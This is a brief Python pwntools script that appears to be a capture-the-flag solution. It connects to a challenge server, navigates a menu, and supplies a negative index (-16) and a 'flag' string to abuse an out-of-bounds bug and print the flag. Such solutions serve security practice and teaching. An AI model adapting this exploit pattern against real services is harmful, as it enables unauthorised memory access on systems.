#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "CRITICAL"  # just print the flag

r = remote(args.HOST, args.PORT, ssl=args.SSL)
if args.TEAM_TOKEN:
    r.sendlineafter(b"token: ", args.TEAM_TOKEN.encode())

r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"> ", b"ciao")
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"> ", str(-16).encode())
r.sendlineafter(b"> ", b"flag\x00")

r.sendlineafter(b"> ", b"0")
s = r.recvuntil(b"> ").decode()
print(s[s.find("snake") : s.rfind("}") + 1])
